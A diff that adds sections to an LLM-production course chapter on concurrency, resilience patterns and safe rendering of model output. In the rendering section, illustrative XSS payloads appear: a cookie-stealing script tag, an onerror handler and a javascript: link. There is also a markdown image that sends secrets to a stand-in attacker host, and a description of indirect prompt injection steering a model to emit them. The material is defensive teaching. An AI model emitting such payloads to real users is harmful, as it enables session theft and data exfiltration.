@@ -168,6 +168,125 @@ Concept 14's ladder went eval-gate → canary, but canary still puts the change 
 
 ---
 
+## Part H — Concurrency & throughput; safe output rendering
+
+Two things that don't break in a notebook and break the *moment* you have real users — gathered here because both live at the **request boundary**. The first **deepens** "parallelize independent calls" ([Part B](#part-b--latency-making-it-feel-fast) concept 6) and the RPM/TPM/429 material ([Part D](#part-d--reliability--scale-under-real-traffic) concept 10) into *measured* **throughput**; the second **extends** Chapter 7's output-guardrail stance from "is the content safe?" to "is it safe to *render*?" — the output surface itself. It does **not** re-cover per-call latency (TTFT/total — [Part B](#part-b--latency-making-it-feel-fast)) or authentication/keys ([Part A](#part-a--the-shape-of-an-llm-application-in-production)); it consumes those and builds on top.
+
+Picture a restaurant kitchen. One dish takes as long as it takes — that's **per-call latency**, fixed by the recipe (the provider), and no amount of cleverness in your code shortens it. But **dinners served per hour** depends on two other things: how many **burners you run at once** (your concurrency) *and* the capacity of the **gas line** feeding them (your provider's TPM). Light every burner you own and the gas line can't keep up — every flame sputters and nothing cooks. That sputter is a **429 storm**: maximize concurrency blindly and you stampede the rate limit until *every* request is failing and retrying. Throughput is therefore a **bounded** concurrency problem — as many burners as the gas line sustains, and not one more.
+
+**24. A request's latency is fixed by the provider; your *service's* throughput is set by concurrency — within a request and across requests.**
+Two different clocks, and beginners conflate them. **Latency** is how long *one* request takes (Part B — dominated by the provider call, you can't beat it by much). **Throughput** is how many requests your *service* completes per unit time — and that you control. It splits into two scopes:
+
+- **Within one request — parallel fan-out.** [Part B](#part-b--latency-making-it-feel-fast) concept 6 said "fire independent calls concurrently"; here it's measured. Three *independent* calls (say a retrieval, a classification, and a summary that don't depend on each other) awaited in a row cost `t1 + t2 + t3`. A **parallel fan-out** — `asyncio.gather` / a thread pool — runs them at once so wall-clock collapses to `max(t1, t2, t3)`, the *slowest leg*, not the sum.
+  ```python
+  # SERIAL — three independent calls, ~0.6s each → ~1.8s wall-clock (each awaits the previous)
+  ctx   = await retrieve(q)        # ~0.6s
+  label = await classify(q)        # ~0.6s   none of these depends on another's result
+  gist  = await summarize(q)       # ~0.6s
+  # total ≈ 1.8s — you paid the sum
+
+  # PARALLEL fan-out — same three calls, dispatched together → wall-clock ≈ max(...) ≈ 0.6s
+  ctx, label, gist = await asyncio.gather(retrieve(q), classify(q), summarize(q))
+  # total ≈ 0.6s — you paid the slowest leg. 3× faster, identical work.
+  ```
+  The OpenAI equivalent is the same shape (`asyncio.gather` over `await client.chat.completions.create(...)`); for a sync SDK, a `concurrent.futures.ThreadPoolExecutor` collapses the same three blocking calls. The rule: *only fan out calls that don't depend on each other* — a step that needs the previous step's output stays serial.
+
+- **Across requests — requests/sec and tokens/sec, not per-call latency.** Stack 100 user requests on the service and the binding constraint is no longer any one call's latency — it's the provider's **RPM (requests/min)** and **TPM (tokens/min)** ceiling ([Part D](#part-d--reliability--scale-under-real-traffic)). So the number that tells you whether you'll survive launch is **requests/sec and tokens/sec sustained**, not the p50 of a single call. A service where each call is a snappy 600 ms can still fall over at 50 concurrent users if that's 200 calls/sec into a 100-call/sec limit.
+- *Build consequence:* Profile two different things. For *one user feeling slow*, optimize latency (Part B). For *the service under load*, measure sustained **requests/sec and tokens/sec** against your RPM/TPM, and fan out every set of independent calls so each request's wall-clock is its slowest leg. The anti-pattern is reporting only per-call latency and being blindsided when the service melts at 30 users.
+
+**25. Throughput is *bounded* concurrency (a semaphore sized to your TPM), not "fire everything at once."**
+The naive next move after discovering `gather` is to fan out *everything* — dispatch all 100 in-flight requests' provider calls simultaneously. That's the **fire-everything-in-parallel** anti-pattern, and it stampedes the rate limit: you blow past TPM, the provider returns **429 Too Many Requests** to a large fraction of calls at once (a **429 storm**), they all back off and retry *together*, re-stampede, and your effective throughput *collapses* below what an orderly queue would have sustained. More concurrency past the limit makes you *slower*, not faster.
+
+The fix is **bounded concurrency**: cap the number of simultaneous provider calls with a **semaphore** (a counter that admits at most *N* holders at once; the *N+1*th waits for a slot) or an equivalent worker pool, with *N* sized to keep you *under* your TPM/RPM rather than crashing into it.
+```python
+# A semaphore caps in-flight provider calls at N. Size N to your TPM, not to "as many as possible".
+sem = asyncio.Semaphore(8)          # at most 8 concurrent provider calls (tune to your rate limit)
+
+async def bounded_call(messages):
+    async with sem:                 # the 9th caller blocks here until a slot frees — no stampede
+        return await call_with_retries(messages)   # Part D retry/backoff still wraps each call
+
+# 100 incoming requests now drain through 8 slots at a sustained rate, instead of 100 simultaneous 429s.
+results = await asyncio.gather(*(bounded_call(m) for m in hundred_requests))
+```
+Worked contrast: **100 concurrent unbounded** calls into a limit that sustains ~8 → most return 429, the retry-storm thrashes, and goodput craters. The **same 100 through a pool of 8** drain steadily at the provider's sustainable rate — higher *real* throughput, no storm, predictable latency. (`call_with_retries` from Part D still wraps each call: the semaphore prevents the storm, retries handle the occasional 429 that slips through.)
+- *Build consequence:* Put every provider call behind a **bounded** concurrency primitive (a semaphore / worker pool / queue) sized to your TPM, and treat 429-rate as a tuning signal — climbing 429s means *lower* N, not "add more workers." Bounded concurrency is the burner count your gas line can actually feed.
+
+**26. Model output is untrusted text headed for a UI — rendering it raw is an injection sink.**
+Chapter 7's guardrails asked *is the content acceptable?* This is a different question at a different layer: *is it safe to **render**?* The model's output is a string you did not write — and a model (or an **indirect injection** that steered it — [Chapter 4](04-rag.md) Part I) can emit markup that *acts* when displayed. Drop it into a web page or a downstream system raw and it's an **injection sink**:
+- `<script>steal(document.cookie)</script>` or `<img src=x onerror="exfiltrate()">` → **XSS** (cross-site scripting: attacker JavaScript running in your user's browser, in your origin).
+- `[click here](javascript:stealSession())` → a `javascript:` link that runs code on click.
+- `![status](https://attacker.tld/log?d=SECRET)` → a markdown image whose URL **exfiltrates** data the moment the client auto-loads it — no click required.
+- a SQL-ish or shell-ish string handed to a downstream interpreter → injection one layer further down.
+
+The stance: **model output is user-generated content (UGC)** — content from an untrusted source — and you treat it exactly as you'd treat a comment a stranger typed into your site. You never render UGC raw. You **sanitize/escape on the way out**: HTML-escape so `<script>` becomes inert text (`&lt;script&gt;`), and **allowlist-render** the few constructs you intend to support (e.g. plain links and images whose URLs match an `https://`-to-known-hosts allowlist; strip `javascript:`/`data:` schemes and event-handler attributes).
+```python
+import html
+# RAW — the sink. The browser executes the onerror handler; the exfil image fires on load.
+page = f"<div>{model_output}</div>"                      # XSS / data-exfil live here
+
+# ESCAPED — model output rendered as inert text; markup shows literally, executes never.
+page = f"<div>{html.escape(model_output)}</div>"         # <script> → &lt;script&gt;, harmless
+# If you must render markdown, run it through a sanitizer with an allowlist (e.g. bleach / DOMPurify):
+#   allow a, img, code, ... ; allow href/src only on an https:// host allowlist; drop javascript:/data:/on*.
+```
+- *Build consequence:* Sanitize/escape model output at the **rendering boundary**, every time, and allowlist-render rather than blocklist. The anti-pattern is *output-is-trusted-because-it's-our-model* — it is not yours; it is UGC the moment a prompt, a tool result, or a retrieved chunk can influence it, and the render layer is the last place to make it inert.
+
+---
+
+## Part I — Resilience: retries, timeouts, circuit breakers, provider fallback
+
+[Part D](#part-d--reliability--scale-under-real-traffic) listed retries, timeouts, and fallbacks "as architecture" (concept 11) and named 429/RPM/TPM (concept 10). This Part turns that list into a **working, ordered stack** and adds the piece Part D left out: the **circuit breaker**. It **deepens** concept 11's retry/timeout/fallback into an *ordered* wrapper around a provider call and **adds** the breaker; it does **not** re-cover the per-call error types (429/500/503 — [Chapter 2](02-apis-and-integration.md) Part E) or rate-limit basics ([Part D](#part-d--reliability--scale-under-real-traffic)) — it assumes those and composes them.
+
+Think of building **fire safety** into a building, layer by layer. A **smoke detector** tells you *fast* that something's wrong instead of waiting until the room is full — that's your **timeout**: don't wait forever to notice a call has hung. If a door sticks you **try it a few times** before giving up, but you don't pound it down — that's **retry with backoff**: a transient blip deserves a second try, not infinite hammering. The **automatic gas/sprinkler shutoff** stops feeding a fire that's clearly established — that's the **circuit breaker**: when a dependency is *down*, stop sending it traffic at all. And the **marked exit** is the planned worse-but-working path out — that's the **fallback**: when everything else fails, degrade gracefully instead of showing an error page. Each layer fixes exactly what the one before it can't.
+
+**27. The four layers, in order, around a single provider call.**
+Resilience isn't one trick; it's four, composed in a specific order around each provider call. Derive the order from what each fixes that the previous can't:
+
+1. **Timeout** — a hard cap on how long you'll wait for a response. *Fixes:* a hung call holding a worker forever. *Can't fix:* anything — it just stops you hanging; the call still **fails**. Never make a provider call without one.
+2. **Retry with exponential backoff + jitter** — on *transient* errors (429, 500, 503, timeout), wait a growing interval (1s, 2s, 4s…) with a random **jitter** added (so 100 clients retrying don't sync up into a fresh stampede), then try again — **capped** (e.g. 3 attempts) and only for **idempotent** calls. *Fixes:* a momentary blip — one bad call out of a healthy stream. *Can't fix:* a real outage — if the provider is *down*, every retry also fails, so retries turn one slow call into a **retry-storm** that piles up latency.
+3. **Circuit breaker** — watches the failure rate across calls; after *N* consecutive failures it **trips** (opens) and, for a **cooldown** window, **fails fast** — returning immediately without even attempting the provider. After the cooldown it goes **half-open**, lets *one* probe through, and **closes** (resumes normal traffic) if the probe succeeds or re-trips if it fails. *Fixes:* the retry-storm — it stops you hammering a dependency that's clearly dead. *Can't fix:* the user still needs an answer.
+4. **Fallback** — when the call fails fast (or exhausts retries), serve an alternate: a **different model / provider** (multi-provider failover), a **semantic-cache** answer ([Part C](#part-c--cost-at-scale-the-bill-is-now-a-system-property) concept 9), or **graceful degradation** — a planned, worse-but-working response ("we're briefly unable to do X; here's Y"). *Fixes:* turning "fail fast" into "still serve something useful."
+
+```python
+# Provider-AGNOSTIC wrapper: the same four layers wrap ANY client call. Swap the client to swap providers.
+@breaker(fail_max=5, cooldown=30)            # trips after 5 failures; fails fast for 30s; then half-open probe
+@retry(max_attempts=3, backoff=expo, jitter=full,   # capped backoff+jitter on transient errors only
+       retry_on=(RateLimit, ServerError, Timeout))
+def call_model(messages, *, client, model, timeout=20):
+    return client.create(model=model, messages=messages, timeout=timeout)   # timeout on EVERY call
+
+def answer(messages):
+    try:
+        return call_model(messages, client=anthropic_client, model="claude-sonnet-4-6")
+    except (CircuitOpen, ProviderError):     # breaker tripped OR retries exhausted → take the marked exit
+        try:
+            return call_model(messages, client=openai_client, model="gpt-4.1")   # multi-provider failover
+        except ProviderError:
+            return DEGRADED   # graceful degradation: a planned worse-but-working answer, logged as a non-event
+```
+> **Setup assumed:** API keys for each provider come from the environment / a secret manager (concept 19), never hardcoded; `client` is a thin adapter so both providers expose one `create(...)` signature ([Part A](#part-a--the-shape-of-an-llm-application-in-production)'s backend boundary). `@breaker`/`@retry` here are illustrative decorators — in practice use a maintained library (e.g. `tenacity` for retry, `pybreaker`/`purgatory` for the breaker) rather than hand-rolling.
+
+- *Build consequence:* Wrap every provider call in **all four**, in this order — timeout inermost, then retry, then breaker, then fallback at the call site. Drop any layer and a specific failure mode goes unhandled: no timeout → hung workers; no retry → blips become user errors; no breaker → outages become retry-storms; no fallback → fail-fast becomes a blank error page.
+
+**28. The circuit breaker is the missing piece — it converts "dog-pile a dead dependency" into "fail fast."**
+Retries alone are a trap at scale. A retry assumes the failure is a *blip on one call*; an **outage** is a *sustained failure across many calls*. When the provider is hard-down, **retries make it worse**: every request retries 3× against a dead endpoint, each waiting out its backoff, so latency piles up and you effectively **DDoS your own dependency** (and burn your worker pool waiting). The **circuit breaker** is the layer that distinguishes the two: it watches failures *across* calls, and once enough pile up it **trips** and **fails fast** for a cooldown — subsequent calls return in *milliseconds* (straight to the fallback) instead of timing out for *seconds* each. Then a single **half-open** probe checks whether the provider recovered before resuming full traffic, so you don't flap.
+
+This is also where **graceful degradation** earns its name: it is a *planned* worse-but-working answer — a cached result, a simpler non-LLM response, an honest "this feature is briefly unavailable, here's what I can still do" — **not** an unhandled exception rendered as a 500 page. The difference between "degraded" and "broken" is whether you wrote the fallback path *on purpose*.
+- *Build consequence:* Add a breaker around any dependency that can have a *sustained* outage (every provider can). Retries and the breaker **stack** — they are not alternatives: retries absorb the one-off blip, the breaker stops the storm when blips become an outage. Without the breaker, your resilience layer becomes the *cause* of the incident.
+
+**29. Prove the resilience path by *firing* it — you don't trust a failover you've never triggered.**
+A resilience stack you've never exercised is a *hope*, not a guarantee — and the day it's supposed to fire is the worst time to discover the fallback throws its own exception. So **force** each failure deliberately and watch the stack degrade end to end. Point the client at a **stub** you control (run it in Docker) that you can make misbehave on demand — return 429s, hang past the timeout, or refuse all connections (hard-down) — and narrate the three cases:
+
+- **(a) One transient 429.** The stub 429s once, then succeeds. The **retry**'s backoff waits and re-issues; the second attempt succeeds; **the user never notices**. The breaker sees one failure (below its threshold), stays closed.
+- **(b) Provider hard-down.** The stub refuses everything. The first few calls fail and retry (briefly), the **breaker trips** after *N* failures, and *every subsequent call* **fails fast in milliseconds** straight to the **fallback model/provider** — no more multi-second timeouts piling up. The user gets a slightly different but correct answer from the secondary provider.
+- **(c) Everything down.** Primary and fallback both refuse. The stack exhausts its options and returns the **graceful-degradation** message — logged as a **non-event** (an expected, handled state), not paged as an outage.
+
+One sentence to keep straight what handled what: the **retry** silently absorbed the *blip on one call* in (a); the **circuit breaker** absorbed the *sustained outage across calls* in (b) by failing fast to the fallback — same dependency failing, two different time-scales, two different layers.
+- *Build consequence:* A **forced-failure test** (stub that 429s, hangs, and hard-downs) proving transient-retry / breaker-trips-fast / degrades-gracefully — each event logged — is part of Definition of Done for any production provider call. Resilience you haven't fired is resilience you don't have.
+
+---
+
 **Resources**
 - Anthropic & OpenAI — rate-limit docs (RPM/TPM), prompt-caching guides, batch API docs, streaming docs, and model-deprecation/versioning pages.
 - A read on **load balancing / horizontal scaling** and **canary/gradual rollouts** at the concept level (general backend ops, applied to an LLM service).
@@ -184,6 +303,11 @@ Concept 14's ladder went eval-gate → canary, but canary still puts the change 
 8. *(Stretch)* **Semantic cache:** cache answered questions by embedding; serve a cached answer when a new question is similar enough. Measure the cache-hit rate and name one question you'd *refuse* to cache.
 9. **Trace it by step:** instrument the Chapter 8 endpoint to emit a **parent span per request** with **child spans** for retrieval and the model call (OTel GenAI attribute names — `gen_ai.request.model`, `gen_ai.usage.input_tokens`/`output_tokens`, `gen_ai.response.finish_reasons` — or a Langfuse/Phoenix SDK self-hosted in Docker). Run a few multi-step requests, pull up **one trace**, and read off *which span dominated latency* and *which chunks retrieval returned*.
 10. **Shadow a second prompt version:** capture a batch of real requests, then **replay** them through a second prompt version *in parallel with* production — score both versions' outputs with your online judge and log the scores side by side, **without exposing the shadow output to any user**. Make a go/no-go call on the candidate from the side-by-side scores alone.
+11. **Parallel fan-out + throughput ([Part H](#part-h--concurrency--throughput-safe-output-rendering)):** take a Chapter-8 request that makes several *independent* calls (e.g. retrieve + classify + summarize). Convert the **sequential awaits** to a **parallel fan-out** (`asyncio.gather` / a thread pool) and measure **wall-clock before vs after** (expect ≈ sum → ≈ slowest leg, e.g. ~1.8s → ~0.6s for three ~600ms calls). Then drive the endpoint with a load of concurrent requests and measure **requests/sec and tokens/sec**.
+12. **Bound the concurrency ([Part H](#part-h--concurrency--throughput-safe-output-rendering)):** fire an **unbounded burst** of provider calls (e.g. 100 at once) against your rate limit and watch the **429 storm** crater goodput. Then put the calls behind a **semaphore / worker pool** sized to your TPM and show the **bounded pool sustains throughput** with no storm. Report sustained requests/sec for both, and the N you settled on.
+13. **Safe output rendering ([Part H](#part-h--concurrency--throughput-safe-output-rendering)):** take a model output carrying an injected `<script>` / `<img onerror=...>` / `[link](javascript:...)` / exfil-image markdown. **Render it raw** to confirm the sink fires (in a sandbox, never a real user). Then add an **output sanitizer** (HTML-escape + a link/image-URL **allowlist**, e.g. `bleach`/DOMPurify) and confirm the same output renders **inert** (markup shown literally, no execution).
+14. **The full resilience stack ([Part I](#part-i--resilience-retries-timeouts-circuit-breakers-provider-fallback)):** wrap a single provider call in all four layers — **timeout**, **capped backoff+jitter retries**, a **simple circuit breaker**, and a **fallback** (alternate model/provider behind one interface, keys from env). Keep it provider-agnostic so swapping the client swaps the provider.
+15. **Force the failures ([Part I](#part-i--resilience-retries-timeouts-circuit-breakers-provider-fallback)):** point the call at a **stub in Docker** you can make misbehave, and prove the stack end to end: (a) a **transient 429** is silently **retried to success** (user never notices); (b) a **sustained outage trips the breaker** → calls **fail fast in ms** to the fallback model instead of timing out for seconds each; (c) **everything down** returns a **degraded-but-working** response, each event **logged**. Write **one sentence** distinguishing what the *retry* handled vs what the *breaker* handled.
 
 **Questions**
 
@@ -196,6 +320,9 @@ Concept 14's ladder went eval-gate → canary, but canary still puts the change 
 6. Give the formula for per-request cost and explain why a "cheap" feature can produce a huge bill.
 7. Name three cost levers and one line on how each saves money.
 8. What are RPM/TPM, what status code signals you hit them, and what's the response?
+17. ([Part H](#part-h--concurrency--throughput-safe-output-rendering)) Distinguish **latency** from **throughput**: which is fixed by the provider, and which does your service control?
+18. ([Part H](#part-h--concurrency--throughput-safe-output-rendering)) Why is model output treated as **UGC**, and what does rendering it raw risk (name the attack)?
+19. ([Part I](#part-i--resilience-retries-timeouts-circuit-breakers-provider-fallback)) Name the four resilience layers in order, and what a **circuit breaker** does when it **trips**.
 
 *Apply it*
 9. Your agent takes ~40 seconds per run. Which delivery pattern fits, and why is a synchronous endpoint wrong?
@@ -203,11 +330,16 @@ Concept 14's ladder went eval-gate → canary, but canary still puts the change 
 11. Under load, users report the bot "forgets" mid-conversation. What's the likely cause given horizontal scaling?
 12. The provider updated the model behind the name you call and quality dropped. What safeguard catches this, and what should you have done to prevent it?
 13. Per-request cost tripled the day after a deploy. How does your logging let you find the cause fast?
+20. ([Part H](#part-h--concurrency--throughput-safe-output-rendering)) One request makes three independent ~600ms model/retrieval calls awaited in sequence. What's the wall-clock, how do you cut it, and to what?
+21. ([Part H](#part-h--concurrency--throughput-safe-output-rendering)) A teammate "fixes" slow throughput by firing all 100 in-flight requests' provider calls at once and 429s explode. What's the actual fix, and how do you size it?
+22. ([Part I](#part-i--resilience-retries-timeouts-circuit-breakers-provider-fallback)) The provider goes hard-down and your retry-only stack makes latency *worse*. Why, and which layer fixes it?
 
 *Stretch*
 14. Design the reliability layer for a high-traffic feature: list every failure mode (429, timeout, 5xx, provider outage) and the architectural response to each.
 15. You want to cut cost 50% without hurting quality. Lay out the levers you'd try, in order, and how your eval set tells you when you've gone too far.
 16. Explain why prompts and model choices are "deployable artifacts" and what production capabilities (gate, canary, rollback) that framing unlocks.
+23. ([Part H](#part-h--concurrency--throughput-safe-output-rendering)) You're launching a feature where each provider call is a snappy 600ms but you expect 50 concurrent users. Explain why per-call latency tells you nothing about whether you'll survive, what you'd measure instead, and the two scopes (within-request, across-request) where you'd intervene.
+24. ([Part I](#part-i--resilience-retries-timeouts-circuit-breakers-provider-fallback)) Design and *prove* the resilience layer for a provider call: name the four layers in order and what each fixes that the prior can't, explain why retries and the breaker **stack** rather than being alternatives, and describe the forced-failure test that demonstrates transient-retry, breaker-trips-fast, and graceful degradation.
 
 **Answer key**
 1. A key in client code is extractable by anyone (web/mobile) and lets them spend your money; the backend is also where prompt assembly, RAG, guardrails, logging, and rate-limiting must live. Client → backend → provider keeps the key and control server-side.
@@ -226,6 +358,14 @@ Concept 14's ladder went eval-gate → canary, but canary still puts the change 
 14. 429 → retry w/ backoff + queue + backpressure; timeout → per-call timeout + retry/fallback; 5xx transient → retry w/ backoff; provider outage → fallback to alternate model/provider, semantic-cache answer, or graceful degradation. Each provider failure has a pre-planned path so the feature degrades, not breaks.
 15. Try in order: prompt caching (stable prefix), route easy traffic to a smaller model, trim/summarize context and retrieve fewer chunks, batch non-urgent work, semantic cache for stable repetitive questions. After each, re-run the eval set; if the quality metric drops below your bar, you've gone too far — back off that lever.
 16. They're configuration that determines behavior and can be versioned, deployed, and reverted like code; that framing unlocks eval-gating before release, canary/gradual rollout behind metrics, A/B testing in prod, and instant rollback — none of which is possible if the prompt is an untracked string edited in place.
+17. **Latency** = how long one request takes; it's dominated by the provider call and effectively fixed by the provider. **Throughput** = how many requests your service completes per unit time; you control it via concurrency (parallel fan-out within a request) and bounded concurrency sized to your RPM/TPM across requests.
+18. Model output is text from an untrusted source (a prompt, tool result, or retrieved chunk can steer it), so you treat it like a stranger's comment — **UGC**. Rendering it raw lets emitted markup *act*: `<script>`/`<img onerror>` → **XSS** (attacker JS in the user's browser), a `javascript:` link, or an exfil markdown image. Sanitize/escape and allowlist-render at the boundary.
+19. (1) **Timeout** — never hang a worker; (2) **retry with backoff+jitter** — capped, idempotent, for transient errors; (3) **circuit breaker** — after N failures it **trips/opens**, **fails fast** for a cooldown (returning immediately instead of calling the dead provider), then **half-opens** to probe recovery; (4) **fallback / graceful degradation**. Tripping = stop attempting the provider and short-circuit to the fallback.
+20. Awaited in sequence the wall-clock is the **sum ≈ 1.8s**. Fan them out concurrently (`asyncio.gather` / thread pool) since they're independent, collapsing wall-clock to the **slowest leg ≈ max ≈ 0.6s** (~3× faster, identical work). Only calls that don't depend on each other can be parallelized.
+21. Firing everything past the rate limit causes a **429 storm** — mass 429s, synchronized retries, re-stampede, goodput collapses. Fix: **bounded concurrency** — a **semaphore / worker pool** capping in-flight calls at N, with N sized to stay *under* your TPM/RPM (climbing 429s means *lower* N, not more workers). Retries still wrap each call for the occasional 429 that slips through.
+22. Retries assume a *blip on one call*; a hard-down provider is a *sustained outage across calls*, so every request retries 3× against a dead endpoint, each waiting out its backoff — latency piles up and you DDoS your own dependency. The **circuit breaker** fixes it: after N failures it trips and **fails fast** to the fallback in ms instead of timing out for seconds per call.
+23. Per-call latency measures one user's experience, not capacity: 50 concurrent users at, say, several calls each can blow past the provider's RPM/TPM even though each call is fast, so the service melts while latency looks fine. Measure **sustained requests/sec and tokens/sec** against your RPM/TPM. Intervene in two scopes: **within a request**, parallel-fan-out independent calls so wall-clock is the slowest leg; **across requests**, put provider calls behind a **bounded** semaphore/pool/queue sized to your TPM so concurrency stays under the limit instead of stampeding it.
+24. Order: **timeout** (stop hanging a worker — but the call still fails) → **retry with backoff+jitter** (survive a transient blip — but a real outage becomes a retry-storm) → **circuit breaker** (stop the storm: trip after N failures, fail fast for a cooldown, half-open probe — but the user still needs an answer) → **fallback** (alternate model/provider, semantic-cache, or planned graceful degradation). Retries and the breaker **stack**, not alternatives: retries absorb the one-off blip, the breaker handles the sustained outage across calls. Prove it by pointing the call at a **stub (in Docker)** you can make 429, hang, or hard-down, then show (a) one transient 429 silently retried to success, (b) sustained outage trips the breaker → fail fast to the fallback in ms, (c) everything down → graceful-degradation response, each logged as a non-event.
 
 **Deliverable:** wrap a prior build ([Chapter 4](04-rag.md) RAG or [Chapter 5](05-agents.md) agent) behind a small **API endpoint** that (a) keeps the key server-side, (b) **streams** responses, (c) **logs** prompt version + tokens + latency + cost per request, (d) has **retry + timeout + fallback** on the provider call, and (e) tags responses with a **prompt version** you can roll back. **Plus** a one-page *production-readiness writeup*: estimated monthly cost at a stated traffic level, your latency budget (TTFT target), the rollout + rollback plan, and which failure modes you've handled.
 
